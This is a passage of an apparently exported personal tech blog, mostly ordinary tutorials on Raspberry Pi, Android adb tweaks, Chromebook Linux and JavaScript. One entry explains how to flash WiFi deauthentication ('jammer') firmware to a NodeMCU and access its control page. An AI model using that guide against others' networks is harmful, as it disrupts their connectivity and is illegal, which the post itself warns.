        "content": "div class=\"embed-responsive embed-responsive-16by9\"\n  iframe class=\"embed-responsive-item\" src=\"\" width=\"300\" height=\"150\" allowfullscreen=\"allowfullscreen\" data-src=\"//www.youtube.com/embed/9hEfCi1-zWo\"/iframe\n/div\n\nThe LG G6 is a phone with little bezel and lots of curves. The rounded corners of the LG G6 look nice but definitely take some time to get used to. Is the LG G6 better than the Samsung Galaxy S8? Who will win the ultimate battle of LG G6 vs Samsung Galaxy S8? Only time will tell.\n",
        "tags": [
            "android",
            "device",
            "g6",
            "lg",
            "lg g6",
            "review"
        ]
    },
    {
        "uri": "/setup-raspberry-pi-3/",
        "title": "Setup Raspberry Pi 3",
        "content": "The Raspberry Pi 3 is an excellent device for those who want the power of a full desktop with the footprint of a small mobile device. Setting up the raspberry Pi 3 is very easy and only takes 15 minutes.\n\nWhat you will need:\n\n  Raspberry Pi 3\n  MicroSD Card (Preferably class 10 or higher)\n  Micro USB Cable and Charger\n  Ethernet Cable (Unless you want to use WiFi)\n  HDMI Cable\n\n Setup Raspberry Pi 3\n\nThere are a couple of different operating system that you could use on the Raspberry Pi. However, I recommended that you use Raspbian because it&#8217;s specifically made for the Raspberry Pi and has all the tools that I beginner or novice would need for the device. To install Raspbian, download a href=\"https://www.raspberrypi.org/downloads/noobs/\" target=\"_blank\" rel=\"noopener\"NOOBS/a. I am using the offline installer, but if you plan to have your Pi connected to the internet, you can use the online installer. After the download finishes, extract the zip to somewhere on your desktop.\n\n{{ ad }}\n\nNext, connect your SD card to your computer and use the program SD Card Formatter to format it. Make sure SIZE ADJUSTMENT is set to ON.\n\nSDXC Cards\n\nIf you&8217;re using an SD Card that is 64 GB or greater, there is an extra step that you are going to need to take. By default, Windows only allows SDXC cards to be formatted to exFat or NTFS and not FAT32. However, the Raspbian bootloader requires that the card is in a FAT32 format. The simple way around that is to download this standalone program called a href=\"http://www.ridgecrop.demon.co.uk/index.htm?guiformat.htm\" target=\"_blank\" rel=\"noopener\"guiformat.exe/a and let it format your card again (keep all the options default).\n\nNow when you check your SDXC in Windows explorer, it should be FAT32.\n\nFinally, transfer all the files inside of the Noobs zip to the root of your SD card.\n\nOn your Pi\n\nAfter the files have been transferred, connect your SD card to your Pi and power it on (there is no power switch, the Pi comes on as soon as you connect the power source). Be sure that you have your Pi connected to a display so that you can continue through the setup process. At the installation screen, you can select the pieces of software that you want to install. Of course, you need to install the Raspbian OS. Optionally, you can also install XMBC (Kodi) on your Pi. When you&8217;re ready hit install and it will begin installing the OS.\n\nSSH Access (Optional)\n\nIt&8217;s a good idea to have SSH setup so that you can access your Pi via command line from any computer without needing a display. To enable SSH, go to the Preferences Menu and Launch the Raspberry Pi Configuration. Then to to the Interfaces Tab and enable SSH.\n\nNow make sure that your Pi is connected to the internet through WiFi or ethernet.. YAou will need to know the IP address of your Pi. To find the IP address, type in the following in terminal: ifconfig\n\nYou should see your local IP address listed under Wlan0 (or Eth0, depending on your configuration).\n\n{{ ad }}\n\nAccessing SSH on Windows\n\nTo access SSH on Windows, download the a href=\"http://www.putty.org/\" target=\"_blank\" rel=\"noopener\"Putty Client. /aIn putty, type in the IP address for the hostname, then hit connect. It will ask you to save the keys, type in yes. The default username and password for the pi is pi and *raspberry. *You will want to change these at some point.\n\n VNC Access (Optional)\n\nThere might be times where you want to see the GUI without connecting a physical monitor to the raspberry pi. This is where VNC comes in handy. To setup VNC, go to the Preferences Menu and Launch the Raspberry Pi Configuration. Then to to the Interfaces Tab and enable VNC.\n\nAlso, make sure that you have the proper software installed on your Pi. In terminal, type in the following:\n\np class=\" language-bash\"\n  codesudo apt-get update/code\n/p\n\np class=\" language-bash\"\n  codesudo apt-get install realvnc-vnc-server realvnc-vnc-viewer/code\n/p\n\np class=\" language-bash\"\n  Now, you can use your favorite client to connect to the VNC. I usually go with the a href=\"https://chrome.google.com/webstore/detail/vnc%C2%AE-viewer-for-google-ch/iabmpiboiopbgfabjmgeedhcmjenhbla?utmsource=chrome-app-launcher-search\" target=\"blank\" rel=\"noopener\"Chrome Extension/a. The default username and password is strongpi /strongand strongraspberry./strong The default port is strong5900./strong\n/p\n\n [1]: http://localhost/wordpress/wp-content/uploads/2017/04/SD-Formatter.jpg\n [2]: http://localhost/wordpress/wp-content/uploads/2017/04/Gui-Format.jpg\n [3]: http://localhost/wordpress/wp-content/uploads/2017/04/Raspberry-Pi-3-Setup-Screen.jpg\n [4]: http://localhost/wordpress/wp-content/uploads/2017/04/putty.png\n",
        "tags": []
    },
    {
        "uri": "/change-navbar-color-android/",
        "title": "Change NavBar Color Android",
        "content": "div class=\"embed-responsive embed-responsive-16by9\"\n  iframe class=\"embed-responsive-item\" src=\"\" width=\"300\" height=\"150\" allowfullscreen=\"allowfullscreen\" data-src=\"//www.youtube.com/embed/5kBcNKU1-vg\"/iframe\n/div\n\nI don&#8217;t like when OEM Skins change the Android Navbar Color. I like the Android Navbar color to always be black. It goes well with most apps and is easy on the eyes at night. Unfortunately, LG made the default color an ugly off white/gray. Using an app called Navbar apps, you can change the Android navigation bar color.\n\nLink: a href=\"https://goo.gl/Rt6myl\" target=\"_blank\"https://goo.gl/Rt6myl/a\n",
        "tags": [
            "android",
            "android customize",
            "change android color",
            "change navbar",
            "navbar",
            "navbar apps",
            "navigation bar",
            "softkeys"
        ]
    },
    {
        "uri": "/delete-pi-user-on-raspberry-pi/",
        "title": "Delete Pi User on Raspberry Pi",
        "content": "\n\nOne of the first things you should do when setting up the Raspberry Pi is to change the default password for the pi user. Personally, I would rather just delete the user altogether and create my own user. So here&#8217;s how I deleted the Pi user on Raspberry Pi.\n\ndiv class=\"alert alert-danger\"\n  Make sure that you backup any important data from your Pi user that you might need.\n/div\n\nStep 1: Create a New User\n\nBefore you begin, make sure that you can SSH into your Raspberry Pi. I first began by creating a new user on the Raspberry Pi. To do so, I entered the following command:\n  \nsudo adduser dave\n\nIt will prompt you to create a password and fill in other account information. Next, I went ahead and added this new user to the sudo group. This is so that I can use the sudo command in this account.\n\nsudo usermod -aG sudo dave\n\nThe -a parameter tells the usermod to append to the given group (-G) which we specified as sudo.\n\n Step 2: Delete Pi User\n\nFor some reason, deleting the Pi user was more of a challenge than I wanted it to be. To delete the Pi user on Raspberry Pi, there are a couple of steps you&#8217;re going to need to get through. First, change the autologin in the display manager. Type in the following:\n\nsudo nano /etc/lightdm/lightdm.conf\n\nThen navigate down to where you see autologin-user and change it to the username that you want. Remember, in the nano text-editor you can use CRTL + O to save. Now we need to do the same thing in the raspberry config. Type in the following:\n\nraspberry-config\n\nYou will see a window appear. Go to boot-options and the CLI sub menu. From there, I changed the option to require login on boot and not autologin.\n\nFinally, once you are ready reboot your raspberry pi:\n\nsudo reboot\n\n* *\n\nNow login to your Pi using the new user. Then run the following command to officially delete  the Pi user:\n\nsudo userdel -r pi\n\nThat&#8217;s it! That&#8217;s how I went about deleting the pi user on Raspberry Pi.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2017/05/delete-pi-user-raspberry-pi.jpg\n [2]: https://www.davebennett.tech/setup-raspberry-pi-3/\n [3]: http://localhost/wordpress/wp-content/uploads/2017/05/raspberry-pi-add-user.png\n [4]: http://localhost/wordpress/wp-content/uploads/2017/05/raspberry-pi-add-user-to-sudo-group.png\n [5]: http://localhost/wordpress/wp-content/uploads/2017/05/autologin-user-pi.png\n [6]: http://localhost/wordpress/wp-content/uploads/2017/05/raspberry-pi-require-login.png\n [7]: http://localhost/wordpress/wp-content/uploads/2017/05/delet-user-pi.png\n",
        "tags": [
            "delete pi user raspberry pi",
            "delete user",
            "linux",
            "raspberry pi",
            "raspberry pi delete user"
        ]
    },
    {
        "uri": "/raspberry-pi-webserver/",
        "title": "Raspberry Pi Webserver",
        "content": "\n\nOne of the reasons that I purchased a Raspberry Pi was so that I can do local website development. Of course, I could have easily set this all up with Windows, but my desktop is already cluttered enough. And with a Raspberry Pi Webserver, I can set up scipts to run independently of my desktop. Here&#8217;s how to setup a Raspberry Pi Webserver\n\nWhat You Will Need:\n\n  Raspberry Pi\n\n Setup Static IP Address\n\nIt would be very annoying to have a website that always changes its address. One day it might be 192.168.0.100 and the next day it might be 192.168.0.105. To avoid this confusion, let&#8217;s setup a static ip address on the raspberry pi. Now the old way of doing this would be to edit the network interfaces file, but the new way is to edit the dhcpcd.conf file. Before you begin, you will need to know the default gateway of your router and your domain name server.\n\nTo get the default gateway, type in the following command:\n\nip route | grep default\n\nThis will display the default gateway; write this number down somewhere. To get your domain name server type in the following:\n\ncat /etc/resolv.conf\n\nThis will display the domain name server. It might be the same address as your default gateway. Finally, you need to add the following lines in the dhcpcd.conf file. Type in the following:\n\nsudo nano /etc/dhcpcd.conf\n\nThen add the following lines at the bottom of the file:\n  \n`br /\ninterface eth0br /\nstatic ip_address=192.168.50.2/24br /\nstatic routers=192.168.50.1br /\nstatic domainnameservers=192.168.50.1br /\n` \n\nFor static ip_address you can choose any unused address on your network. Keep in mind that your network might be configured slightly different than mine so change the numbers accordingly. The static router is the default gateway of your router and static domain name server is your domain name server. You should have obtained this information from the previous step. If you are connecting via wireless lan and not ethernet, change interface eth0 to `interface wlan0br /\n` \n\nFinally, reboot your rasbperry pi by typing in sudo reboot  Next time you SSH into your pi, you need to use to the new ip address that you assigned it.\n\nInstall Apache\n\nSo for right now, we are not going to get fancy with a Node JS server or anything like that. We are going to setup a simple apache server to serve html files. Open up terminal and type in the following:\n\nsudo atp-get update\n\nsudo apt-get install apache2 -y\n\nThis will install the apache server. To test that it works, navigate to http://localhost on the raspberry pi or to the Pi&8217;s iP address (192.xxx.xxx) on any other device. You should be greeted by the following welcome page. Remember that the default location of your website is the var/www/html directory.\n\nInstall PHP\n\nUnless you&8217;re building a truly static website, you will also need the assistant of PHP to perform some server-side tasks. To install php type the following in terminal:\n\nsudo apt-get install php5 libapache2-mod-php5 -y\n\nYou can through a php file in the website directory to test that it is working. And that is it. You now have a webserver running on the raspberry pi.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2017/05/raspberry-pi-webserver.jpg\n [2]: http://localhost/wordpress/wp-content/uploads/2017/05/apache-it-works.png\n",
        "tags": [
            "html",
            "php",
            "raspberry pi",
            "server",
            "webserver"
        ]
    },
    {
        "uri": "/5-actually-cool-android-tricks/",
        "title": "5 Actually Cool Android Tricks",
        "content": "div class=\"embed-responsive embed-responsive-16by9\"\n  iframe class=\"embed-responsive-item\" src=\"\" width=\"300\" height=\"150\" allowfullscreen=\"allowfullscreen\" data-src=\"//www.youtube.com/embed/guO-ar2fp8M\"/iframe\n/div\n\nHere are 5 actually cool Android tricks that you can try on your device. A couple of these tricks will require that you have adb installed on your computer. None of these tricks require root.\n\nHide Soft Keys\n\nSoftkeys are usually convenient to have but can eat up precious screen real estate. Unfortunately, not many android developers give users to ability to use their app in immersive mode (which autohides the softkeys). However, using the following adb command, you can have your softkey hidden at all times. Swiping up from the bottom of the screen will reveal them for a couple of seconds before they hide again.\n\nadb shell settings put global policy_control immersive.navigation=apps\n\nIf you want to white list certain apps (such as nova launcher) you can type in the following:\n\nadb shell settings put global policy_control immersive.navigation=apps,-com.teslacoilsw.launcher\n\nTo restore your softkeys back to normal, type in the following command:\n\nadb shell settings put global policy_control null*\n\nYou can check out this a href=\"https://forum.xda-developers.com/nexus-6p/general/guide-hide-navigation-bar-status-bar-app-t3509747\" target=\"_blank\" rel=\"noopener noreferrer\"XDA thread/a for more info.\n\n Remove Icons From Status bar\n\nThat damn NFC icon! It is one of the most annoying things that I have to look at every day. Yes, I keep my NFC on all the time but no, I do not need a notification for it. To remove icons from your status bar type in the following in adb:\n\nadb shell settings put secure icon_blacklist nfc\n\nThis will remove the NFC icon from your status bar. There are other icons you can remove such as bluetooth and signal strength. Check out this a href=\"https://forum.xda-developers.com/htc-10/how-to/remove-nfc-icon-root-adb-t3507739\" target=\"_blank\" rel=\"noopener noreferrer\"XDA thread/a.\n\nSystem UI Tuner\n\nSystem UI tuner allows you to make subtle modifications to various UI elements on your Android device (such as removing status bar icons). If you have a device running stock Android (such as a Nexus or Pixel) then enabling System UI tuner is easy. Just hold the settings gear icon in the quick panel window. You will feel a vibration then get a notification that System UI tuner has been enabled.\n\nIf you aren&8217;t using a stock Android device, there still is another solution. On my Galaxy S8, I used a href=\"https://play.google.com/store/apps/details?id=com.zacharee1.systemuituner\" target=\"_blank\" rel=\"noopener noreferrer\"this app/a to access System UI tuner. Just a heads up, you will need to type in a couple of adb commands to give it the necessary permissions that it needs.\n\nGood Morning Google\n\nIf you say &8220;Good Morning&#8221; to Google Assistant, it will read out your agenda along with the weather and the top news headlines.\n\nMove Any App to SD\n\nIf you have a phone that has external storage, then this trick is for you. By default, not every app can be moved to external storage. However, if you enable developer options on your phone, then navigate to the bottom of the options list, you will see an option to force allow all apps to external storage. It actually works! Once you select it, any app will be able to be moved to external storage. Just be careful because certain apps might crash because they rely on their data always being accessible (which won&8217;t be the case if you remove the SD card).\n\n [1]: https://www.davebennett.tech/how-to-install-adb/\n",
        "tags": [
            "android",
            "android hacks",
            "android tricks",
            "awesome android features",
            "cool android tricks"
        ]
    },
    {
        "uri": "/developer-mode-chromebook/",
        "title": "Enable Developer Mode on Chromebook",
        "content": "If you want to get root acess or install Linux or Windows on your Chromebook at some point, then you will need to enable Developer Mode on Chromebook. To Enable Developer mode on Chromebook is very easy and only takes a few minutes.\n\np class=\"notice--warning\"\n  This strongwill erase all of your data/strong on your Chromebook.\n/p\n\nGet Started {get-started}\n\nStart at your homescreen and hold the following keys:\n\npreESC + Refresh (F3) + POWER/pre\n\nYour screen will briefly turn off before coming back on again. It’s going to be a white screen with the text OS verification.\n\nNow hold down the following keys:\n\npreCRTL + D/pre\n\n{{ ad }}\n\nThis will turn OS verification off. It will then reboot once more and erase your data before turning on developer mode. Once it’s complete, you will be back at the Chrome Login screen where you can set up your account.\n\nThat Scary White Screen {that-scary-white-screen}\n\nOnce you enable Developer mode, you will get that scary OS verification screen everytime you boot your Chromebook. You can either wait 30 seconds or hit CRTL + *D* to bypass it. If you really want to get rid of this screen, you could flash a custom firmware. We’ll talk more about that later though.\n\n [1]: https://www.davebennett.tech/install-linux-on-chromebook/\n",
        "tags": [
            "developer mode chromebook"
        ]
    },
    {
        "uri": "/install-linux-on-chromebook/",
        "title": "Install Linux on Chromebook",
        "content": "Tired of Chrome OS? Do you want to play games like Minecraft or Steam Games on your Chromebook? Luckily, Linux allows you to accomplish some of that. To install Linux on Chromebook, we are going to use the crouton script. The script takes care of all of the downloading and configuration. All you need to do is run a couple of commands.\n\np class=\"notice--warning\"\n  You need to make sure that you have a href=\"https://www.davebennett.tech/developer-mode-chromebook/\" target=\"_blank\" rel=\"noopener\"developer mode enabled on your chromebook/a before attempting this.\n/p\n\nGet Started {get-started}\n\nTo install Linux on Chromebook, you first need to download the crouton file. You can either direct download the file or check out the Github Page for more information. Then open up the Chrome browser on your Chromebook. Hold down the following keys to open up the console window.\n\npreCRTL + ALT + T/pre\n\nInside of the console window type in:\n\npreshell/pre\n\nNow you have access to the Chrome OS shell. If you don’t care about customization and you just want to install Linux on your chromebook, type in the following:\n\npresudo sh ~/Downloads/crouton/pre\n\n{{ ad }}\n\nThis will download and install Ubuntu 12.04 with the Unity desktop environment. That’s sufficient for most people, but not ideal. Ubuntu 12.04 is quite old and Unity is very resource heavy. So instead, you should check out other distributions. To see a list of what’s available type in the following:\n\npresudo sh ~/Downloads/crouton -r list/pre\n\nThis will return to you a list of all of the available distributions. I recommend that you use trusty (Ubuntu 14.04). You can try the latest version (Ubuntu 16.04) if you’re daring, but you might encounter a lot of bugs. Finally, let’s choose a different desktop environment. I recommended xfce because it’s lightweight. So now type in the following:\n\npresudo sh ~/Downloads/crouton -r trusty -t xfce/pre\n\nThe -r specifies that distribution and the -t specifies the desktop environment. This will begin downloading and installing Ubuntu trusty. It’s going to take a few minutes so use this time to snack on that spare donut you have laying around. Before it finishes, it will ask you to create a username and password for the Linux system.\n\n{{ ad }}\n\nPost Install {post-install}\n\nTo launch the Linux operating system that you just installed you need to type the following in the console:\n\npresudo startunity/pre\n\nBasically, type in start followed by your chosen desktop environment. The above command is for those of you who stuck with the default configuration. If you followed my configuration, you would type in the following:\n\npresudo startxfce4/pre\n\nAlternatively, if you wish to start Ubuntu without the GUI you would type in the following:\n\npresudo enter-chroot trusty/pre\n\nSwitching between Chrome OS and Linux {switching-between-chrome-os-and-linux}\n\nThe cool thing about using the crouton installer is that it allows you to switch back and forth between Chrome OS and Ubuntu. To switch, hold down the following keys:\n\npreCRTL + ALT + SHIFT + Back-Arrow/pre\n\nor to go the other way:\n\npreCRTL + ALT + SHIFT + Forward-Arrow/pre\n\n{{ ad }}\n\nLogging in and Out {logging-in-and-out}\n\nWhenever you are done with Linux, make sure to properly log out so that the operating system can release resources back into Chrome OS. Whenever you want to get back into Linux, open up a shell window (CRTL + ALT + T) and typing in sudo startxfce4 or sudo startunity\n\n [1]: https://goo.gl/fd3zc\n [2]: https://github.com/dnschneid/crouton\n",
        "tags": [
            "crouton",
            "linux chromebook"
        ]
    },
    {
        "uri": "/remove-linux-on-chromebook/",
        "title": "Remove Linux on Chromebook",
        "content": "Tired of crouton? If you installed Linux on your Chromebook using the crouton installer and you’re ready to delete it, here&#8217;s how to remove Linux on Chromebook.\n\nSuper Simple {super-simple}\n\nOn your Chromebook, open up the Chrome browser. Then open up the terminal by typing in the following:\n\npreCRTL + ALT + T/pre\n\nInside of the terminal, type in:\n\npreshell/pre\n\nFinally, type in the following command to delete Linux from your Chromebook. Replace precise with the version of Ubuntu or distribution of Linux that you’re using:\n\n{{ ad }}\n\npresudo delete-chroot precise/pre\n\nIf you followed by costume configuration from the previous tutorial then you would type in:\n\npresudo delete-chroot trusty/pre\n\nThat’s it. It will ask you for confirmation and delete the data. That&#8217;s how to remove Linux on Chromebook.\n\n [1]: https://www.davebennett.tech/install-linux-on-chromebook/\n",
        "tags": [
            "crouton",
            "remove linux chromebook"
        ]
    },
    {
        "uri": "/android-wifi-jammer/",
        "title": "Android WiFi Jammer",
        "content": "For less than $10, you can have an Android WiFI Jammer up and running. To get started, you are going to need to have the NodeMCU. It&#8217;s a WiFI development chip that&#8217;s usually used in Raspberry Pi and Arduino projects. However, the chip can also be used as a standalone device (it has its own CPU and memory) as long as you give it sufficient power. This means you can power it through another Android phone, your computer, power bank or any device that&#8217;s capable of supplying power over USB.  Did I mention that it&#8217;s only $9 on Amazon? As for the actual penetration testing, you will need to flash firmware to the device.\n\ndiv class=\"alert alert-danger\"\n  strongJamming WiFi networks is illegal!!/strong This is only intended to be used for security testing on your own WiFi network.\n/div\n\nWhat You Will Need:\n\n  a href=\"https://www.amazon.com/HiLetgo-Version-NodeMCU-Internet-Development/dp/B010O1G1ES/ref=sr1_2?ie=UTF8&qid=1495935342&sr=8-2-spons&keywords=nodemcu&psc=1\" target=\"blank\" rel=\"noopener noreferrer\"NodeMCU/a\n  a href=\"https://github.com/spacehuhn/esp8266deauther/releases\" target=\"blank\" rel=\"noopener noreferrer\"Firmware/a\n  a href=\"https://github.com/nodemcu/nodemcu-flasher\" target=\"_blank\" rel=\"noopener noreferrer\"NodeMCU Flasher/a\n\n Flash Firmware\n\n{{ ad }}\n\nBegin by connecting the NodeMCU to your computer via USB. Don&#8217;t worry, your computer will probably not recognize the device. Then download the firmware (esp8266\\_deauther\\_1mb.bin) from the link above. Make sure you download the latest release by the developer. Afterward, download the NodeMCU flasher. In the flasher, go to the config tab and select the bin that you downloaded earlier as the firmware to use. Then hit flash to start the process, it should take about a minute. Once it&#8217;s done you are ready to use the device.\n\nAfterward, download the NodeMCU flasher. When you launch the flasher it should detect the COM port that the NodeMCU is connected to.\n\nThen go to the config tab and select the bin that you downloaded earlier as the firmware to use. Then hit flash to start the process, it should take about a minute. Once it&#8217;s done you are ready to use the device.\n\nUsing the NodeMCU\n\nTo use the NodeMCU, connect it to any power source. This could be your computer, another Android phone, etc. You should see a blinking blue light. Now to access the interface, you will need to connect to the local area network it creates. Using my Android phone, I connected to the network named pwned. The default password for the network is deauther. Keep in mind, this is only a local connection so you will not get access to the internet. Once you are connected, open your browser and navigate to *192.168.4.1 *You should see a warning screen, make sure you understand and accept the terms. From this point, you&8217;re on your own to do what you want.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2017/05/nodemcu-flasher.png\n [2]: http://localhost/wordpress/wp-content/uploads/2017/05/nodemcu-flasher-bin.png\n",
        "tags": [
            "android",
            "android hacks",
            "android wifi jammer",
            "dsploit",
            "mitm",
            "wifi jamnmer"
        ]
    },
    {
        "uri": "/play-4k-youtube-videos-android/",
        "title": "Play 4K YouTube Videos on Android",
        "content": "So we have these impressive ultra-high resolution smartphones, yet we still can&#8217;t seem to play 4k youtube videos on Android. Some devices can&#8217;t even play 1440p YouTube videos despite having the appropriate screen resolution. Luckily, there is a simple trick that you can do to get a higher resolution format via the YouTube app on your phone, even if your screen resolution is not 4k. Essentially, we are going to add a line to the build prop that &#8220;tricks&#8221; the YouTube app into thinking you have a different display size.\n\nWhat You Will Need:\n\n  Terminal Emulator\n  Rooted Android Device\n\n How To:\n\nOpen up the terminal emulator app and type in the following commands:\n\nsu\n\nsetprop sys.display-size 3840x2160\n\nIf you have the youtube app opened, close it (or force stop it). Now go back into the app and find a 4K video (a href=\"https://www.youtube.com/user/Opensourcegangster\" target=\"_blank\" rel=\"noopener\"or watch one of mine/a). You should now have more HD formats to choose from. You might not get a 2160p option but you should definitely have a 1440p option.\n",
        "tags": [
            "4k",
            "android",
            "build prop",
            "root",
            "terminal",
            "youtube"
        ]
    },
    {
        "uri": "/install-kali-linux-on-chromebook/",
        "title": "Install Kali Linux on Chromebook",
        "content": "Kali Linux is a popular security focused operating system. It offers a lot of&#8230;eh&#8230;&#8221;interesting&#8221; use case scenarios. To install Kali Linux on the Chromebook is very easy. Crouton (the popular open source script that is used to install other operating systems on the Chromebook such as a href=\"https://www.davebennett.tech/install-linux-on-chromebook/\" target=\"_blank\" rel=\"noopener\"Ubuntu on Chromebook/a) can be used to install Kali Linux on Chromebook.\n\ndiv class=\"alert alert-warning\" role=\"alert\"\n  strongBefore you begin!/strong a href=\"https://www.davebennett.tech/developer-mode-chromebook/\" target=\"_blank\" rel=\"noopener\"You will need to have developer mode enabled on your Chromebook./a\n/div\n\nWhat You Will Need:\n\n  a href=\"https://github.com/dnschneid/crouton\" target=\"_blank\" rel=\"noopener\"Crouton File/a\n\n Install Kali Linux on Chromebook\n\nOn your Chromebook, start by opening the terminal:\n\npreCRTL + ALT + T/pre\n\nInside of terminal, enter shell:\n\npreshell/pre\n\nNow begin by downloading the latest version of Kali Linux and setting your desktop environment. I am sticking with xfce for my desktop environment but you can change it to whatever you desire:\n\npresudo sh -e ~/Downloads/crouton -r kali-rolling -t xfce/pre\n\nThis will begin the installation of Kali Linux. Give it a couple of minutes to complete.\n\n{{ ad }}\n\nStarting up Kali Linux\n\nTo start up Kali Linux, simply enter in:\n\npresudo startxfce4/pre\n\n*Now there might be a good chance that it fails to start up. *You might get the following error: Owner of /tmp/.X11-unix should be set to root. There seems to be a bug with an old X-org file causing it to crash. Don&8217;t worry, there&#8217;s a way around this. We simply need to enter the Kali Linux environment and remove it. Type in the following to enter Kali Linux without gui:\n\npresudo enter-chroot -n kali-rolling/pre\n\nThen make sure the repository is up to date:\n\npresudo apt-get update/pre\n\nFinally, remove the offending file:\n\npresudo apt remove xserver-xorg-legacy/pre\n\nThen type exit to exit the chroot. Finally, type in:\n\npresudo startxfce/pre\n\nYour desktop environment should start and you will have Kali Linux running on your Chromebook.\n\n{{ ad }}\n",
        "tags": [
            "crouton",
            "kali chromebook",
            "kali linux chromebook",
            "linux chromebook"
        ]
    },
    {
        "uri": "/android-freeform-mode/",
        "title": "Android Freeform Mode",
        "content": "Android Freeform mode is a new hidden feature in Android Nougat (7.0). According to the Android developer guide, &#8220;Manufacturers of larger devices can choose to enable freeform mode, in which the user can freely resize each activity. If the manufacturer enables this feature, the device offers freeform mode in addition to split-screen mode.&#8221; Although the developer guides species larger devices, this could be enabled on smaller devices as well.\n\nEnabling Android Freeform Mode\n\nHere&8217;s how the average user can enable freeform mode on their Android device. The first option requires that you have the a href=\"https://www.davebennett.tech/how-to-install-adb/\" target=\"_blank\" rel=\"noopener\"Android development Bridge (ADB) setup on your computer./a If you do, all you need to do is type in the following:\n\n adb shell settings put global enablefreeformsupport 1\n\nThen reboot your phone. When your phone reboots, you should now have an extra icon when you open up recents.\n\nTapping this icon should allow you to open apps in freeform mode. However, this doesn&#8217;t seem to work on Android 7.1.2 or my Galaxy S8 running Android 7.0.\n\n{{ ad }}\n\noption 2\n\nThe easier option is to download the app called a href=\"https://goo.gl/ymouhK\" target=\"_blank\" rel=\"noopener\"taskbar/a. Within the app, enable the freeform mode. It will give you a small launcher at the bottom of the screen. When you open an app through that launcher it will launch in freeform mode. Not every app will be compatible though.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2017/07/Screenshot_20170704-145844.png\n [2]: http://localhost/wordpress/wp-content/uploads/2017/07/Screenshot_20170704-110704-1.png\n",
        "tags": [
            "android",
            "floating window",
            "freeform",
            "hidden features",
            "nougat"
        ]
    },
    {
        "uri": "/amazon-echo-show-web-browser/",
        "title": "Amazon Echo Show Web Browser",
        "content": "The Amazon Echo Show has a hidden web browser, and here is how you can enable it. Keep in mind that the Amazon Echo Show is running Android at its core. Therefore, like any normal Android web browser, you have access to the same WebKit features and vulnerabilities when using the browser.\n\nEnable Amazon Echo Show Web Browser\n\nGo into your settings and go to Legal and Compliance.\n\nThen go into Amazon Privacy Notice.\n\nFrom there, scroll to the section that says Information We Collect. You should find a link that says My Account. Clicking on it will take you to Amazon&8217;s homepage. From there, just search for any outbound link. I searched for the Google app, then went to their privacy policy page which eventually led me to Google&#8217;s home page.\n\n&nbsp;\n\n [1]: http://localhost/wordpress/wp-content/uploads/2017/07/P1010098.000101_16.Still010.jpg\n [2]: http://localhost/wordpress/wp-content/uploads/2017/07/P1010098.000013_18.Still006.jpg\n [3]: http://localhost/wordpress/wp-content/uploads/2017/07/P1010098.000016_01.Still007.jpg\n [4]: http://localhost/wordpress/wp-content/uploads/2017/07/P1010098.000053_18.Still009.jpg\n",
        "tags": [
            "amazon echo show",
            "echo"
        ]
    },
    {
        "uri": "/overclock-chromebook/",
        "title": "Overclock Chromebook",
        "content": "Overclock Chromebook? It sounds like something that should be impossible to do. However, with the power of Linux, everything is possible. The Chromebook doesn&#8217;t have the typical bios that you would find on a standard PC. Therefore, you can&#8217;t easily change the CPU frequency. Using Linux, we can achieve a software FSB overclock or underclock. For this tutorial, let&#8217;s focus on underclocking because that&#8217;s the easier thing to do (damn that click bait). Overclocking is not impossible to do, but will require a deep understanding of FSB overclocking and its relation to your chipset. Try a href=\"http://lfsb.sourceforge.net/\" target=\"_blank\" rel=\"noopener\"this tool/a if you are interested.\n\ndiv class=\"alert alert-warning\" role=\"alert\"\n  bYou will need to make sure that you havea href=\"https://www.davebennett.tech/install-linux-on-chromebook/\" target=\"_blank\" rel=\"noopener\" Linux Installed on your Chromebook/a!/b\n/div\n\nChange Chromebook CPU Frequency\n\nBegin by opening a terminal in Chrome OS by holding down *CRTL + ALT + T. * Inside of terminal type in the following:\n\npreshell/pre\n\npresudo enter-chroot -n trusty/pre\n\n(you can change trusty to the name of the Linux distribution that you have installed.)\n\nNow download the cpu frequency utils program:\n\npresudo apt-get install cpufrequtils/pre\n\nNow check your current CPU frequency speed:\n\npresudo cpufreq info/pre\n\n{{ ad }}\n\nMy current CPU speeds are at 1.4Ghz which is the max speed. To underclock to 1.2Ghz I entered the following commands:\n\npresudo cpufreq-set -c0 -u 1200000\n\nsudo cpufreq-set -c1 -u 1200000/pre\n\nc0 and c1 represent the two CPU cores on my Chromebook and the -u parameter tells the program to make that the maximum frequency. Now if you run the cpufreq info command from earlier, you should see the adjusted CPU speed. Keep in mind, these changes will not persist over a reboot.\n\n&nbsp;\n\n&nbsp;\n",
        "tags": [
            "chromebook",
            "crouton",
            "fsb",
            "overclock"
        ]
    },
    {
        "uri": "/javascript-callbacks/",
        "title": "JavaScript Callbacks",
        "content": "\nIn Javascript, a callback function is a function that is passed into another function as an argument. This allows you to invoke that function with a return value. Remember, Javascript&#8217;s implementation within a browser is single threaded (well..until recently at least). That means that all of your code is executed within one linear operation. However, there are some functions in Javascript which are asynchronous. That means that they have the privilege to be invoked anywhere in that line of execution. Javascript callbacks are useful because they allow you to efficiently program for async functions.\n\nHere&#8217;s a simple example. Suppose I have a program that is supposed to print out the letters &#8220;A, B and C&#8221;:\n\npreconsole.log('A' );\nconsole.log('B');\nconsole.log('C');/pre\n\nOkay, that&#8217;s not hard. Now, let&#8217;s expand this a bit. Suppose this program is split into two different functions. The first function prints A then calls another function which prints function B. Afterwards, it prints function C. Again, this wouldn&#8217;t be a hard program to write with those specifications.\n\n{{ ad }}\n\nHowever, pretend that we want to wait three seconds before function B is called. Why wait three seconds? Well, you might have a function that makes a request to a server and it takes time to get a response. So let&#8217;s pretend those three seconds represent some network activity happening. So here&#8217;s what the code would look like:\n\nSo the above code will print out: A, C then B. And that&#8217;s not the order that we want. So essentially, there are two ways that we could fix this. The most obvious way would be to move the console.log(&#8216;C&#8217;) right after the doAfterDelay() function. This works because the settimeout function takes an anonymous function that is used as the callback. So this whole time, you were using callbacks and you probably didn&#8217;t even realize it.\n\nThe second way is to write our own\\*\\* callback\\*\\*. That is what we are going to do. Remember, a callback is just a function that is passed as a parameter. So in my doAfterDelay() function I setup a new argument called callbackFunction. Then I return the console.log(&#8216;B&#8217;) in that argument. When I call doAfterDelay() in my settimout function, I pass in an anonymous function to it (using the a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrowfunctions\" 